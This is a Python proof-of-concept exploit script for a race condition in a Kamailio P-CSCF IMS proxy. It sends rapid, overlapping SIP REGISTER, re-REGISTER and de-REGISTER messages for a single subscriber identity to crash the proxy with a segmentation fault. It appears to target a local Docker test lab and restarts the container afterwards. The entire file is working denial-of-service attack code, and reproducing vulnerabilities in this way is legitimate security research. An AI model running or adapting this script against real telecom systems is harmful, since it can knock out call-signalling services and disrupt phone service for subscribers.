#!/usr/bin/env python3
"""
PoC: P-CSCF Registration Race Condition SIGSEGV
=================================================
Reference: https://github.com/kamailio/kamailio/issues/4670

Vulnerability: Race condition in ipsec_create/REGISTER_reply path.
When multiple REGISTER transactions for the same UE overlap in time,
the pcontact state machine gets confused (reg_state[unknown]),
leading to SIGSEGV in ipsec_create.

Attack: Send rapid REGISTER/re-REGISTER/de-REGISTER sequences
for the same UE identity with different Call-IDs to create
overlapping transactions.

Target: P-CSCF (172.22.0.21:5060)
"""

import socket
import struct
import time
import subprocess
import sys
import threading
import random


PCSCF_IP = '172.22.0.21'
PCSCF_PORT = 5060
UE_IP = '172.29.0.21'  # uesimtun1
UE_PORT = 5060
IMSI = '460090000000001'
DOMAIN = 'ims.mnc009.mcc460.3gppnetwork.org'


def check_container(name):
    result = subprocess.run(
        ['docker', 'inspect', '-f', '{{.State.Running}}', name],
        capture_output=True, text=True
    )
    return result.stdout.strip() == 'true'


def build_register(call_id, cseq, expires=3600, branch=None):
    """Build a SIP REGISTER message"""
    if branch is None:
        branch = f"z9hG4bK{random.randint(100000,999999)}"
    
    contact_expires = f";expires={expires}" if expires > 0 else ";expires=0"
    
    msg = (
        f"REGISTER sip:{DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {UE_IP}:{UE_PORT};branch={branch};rport\r\n"
        f"From: <sip:{IMSI}@{DOMAIN}>;tag={random.randint(10000,99999)}\r\n"
        f"To: <sip:{IMSI}@{DOMAIN}>\r\n"
        f"Call-ID: {call_id}\r\n"
        f"CSeq: {cseq} REGISTER\r\n"
        f"Contact: <sip:{IMSI}@{UE_IP}:{UE_PORT}>{contact_expires}\r\n"
        f"Max-Forwards: 70\r\n"
        f"User-Agent: RacePoC/1.0\r\n"
        f"Supported: path, outbound\r\n"
        f"Allow: INVITE, ACK, CANCEL, BYE, UPDATE, REFER, NOTIFY, INFO, OPTIONS, PRACK\r\n"
        f"Authorization: Digest username=\"{IMSI}@{DOMAIN}\",realm=\"{DOMAIN}\","
        f"uri=\"sip:{DOMAIN}\",nonce=\"\",response=\"\"\r\n"
        f"Content-Length: 0\r\n"
        f"\r\n"
    )
    return msg.encode()


def send_udp(data, target_ip, target_port):
    """Send UDP data"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        sock.sendto(data, (target_ip, target_port))
        try:
            resp, _ = sock.recvfrom(4096)
            return resp
        except socket.timeout:
            return None
        finally:
            sock.close()
    except Exception as e:
        return str(e).encode()


def send_udp_norecv(data, target_ip, target_port):
    """Send UDP without waiting for response"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(data, (target_ip, target_port))
        sock.close()
    except:
        pass


def race_attack_round(round_num, num_parallel=5):
    """
    One round of the race condition attack:
    - Send initial REGISTER
    - Immediately send re-REGISTER (same Call-ID, higher CSeq)
    - Immediately send de-REGISTER (expires=0)
    - Also send parallel REGISTERs with different Call-IDs
    """
    base_call_id = f"race-{round_num}-{random.randint(10000,99999)}@{UE_IP}"
    
    # 1. Initial REGISTER (no auth)
    reg1 = build_register(base_call_id, 1, expires=3600)
    
    # 2. Re-REGISTER (same Call-ID, higher CSeq)
    reg2 = build_register(base_call_id, 2, expires=3600)
    
    # 3. De-REGISTER (expires=0)
    reg3 = build_register(base_call_id, 3, expires=0)
    
    # 4. Parallel REGISTERs with different Call-IDs (same UE)
    parallel_regs = []
    for i in range(num_parallel):
        cid = f"race-{round_num}-par{i}-{random.randint(10000,99999)}@{UE_IP}"
        parallel_regs.append(build_register(cid, 1, expires=3600))
    
    # Send all in rapid succession (no waiting)
    send_udp_norecv(reg1, PCSCF_IP, PCSCF_PORT)
    send_udp_norecv(reg2, PCSCF_IP, PCSCF_PORT)
    send_udp_norecv(reg3, PCSCF_IP, PCSCF_PORT)
    for pr in parallel_regs:
        send_udp_norecv(pr, PCSCF_IP, PCSCF_PORT)
    
    # Brief pause to allow 401 responses to arrive and be processed
    time.sleep(0.05)
    
    # Send authenticated REGISTERs (simulating response to 401)
    # These will trigger the REGISTER_reply path on P-CSCF
    auth_reg1 = build_register(base_call_id, 4, expires=3600)
    auth_reg2 = build_register(base_call_id, 5, expires=0)  # de-register with auth
    send_udp_norecv(auth_reg1, PCSCF_IP, PCSCF_PORT)
    send_udp_norecv(auth_reg2, PCSCF_IP, PCSCF_PORT)


def main():
    print("=" * 70)
    print("P-CSCF Registration Race Condition PoC")
    print("Reference: Kamailio Issue #4670")
    print("Target: ipsec_create/REGISTER_reply SIGSEGV")
    print("=" * 70)
    
    # Verify P-CSCF is running
    if not check_container('pcscf'):
        print("[!] P-CSCF is not running. Start it first.")
        sys.exit(1)
    
    print(f"\n[*] P-CSCF is running. Starting race condition attack...")
    print(f"[*] Sending rapid REGISTER sequences to {PCSCF_IP}:{PCSCF_PORT}")
    
    start_time = time.time()
    total_rounds = 200
    check_interval = 20
    
    for round_num in range(total_rounds):
        race_attack_round(round_num, num_parallel=3)
        
        # Check P-CSCF status periodically
        if round_num % check_interval == (check_interval - 1):
            elapsed = time.time() - start_time
            running = check_container('pcscf')
            print(f"  [{round_num+1}/{total_rounds}] {elapsed:.1f}s - P-CSCF: {'UP' if running else 'DOWN'}")
            
            if not running:
                print(f"\n*** P-CSCF CRASHED after {round_num+1} rounds! ***")
                print(f"*** Time: {elapsed:.1f} seconds ***")
                print(f"*** Attack: Registration race condition (Issue #4670) ***")
                return True
        
        # Very brief pause between rounds to avoid overwhelming the network stack
        time.sleep(0.02)
    
    # Final check
    running = check_container('pcscf')
    elapsed = time.time() - start_time
    
    if not running:
        print(f"\n*** P-CSCF CRASHED! ***")
        return True
    else:
        print(f"\n[*] P-CSCF survived {total_rounds} rounds ({elapsed:.1f}s)")
        print(f"[*] The race condition may require more specific timing or")
        print(f"[*] the issue may have been fixed in 6.1.3")
        return False


if __name__ == '__main__':
    crashed = main()
    if crashed:
        print("\nRestarting P-CSCF...")
        subprocess.run(['docker', 'restart', 'pcscf'], capture_output=True)
        time.sleep(10)
        print(f"P-CSCF restarted: {check_container('pcscf')}")
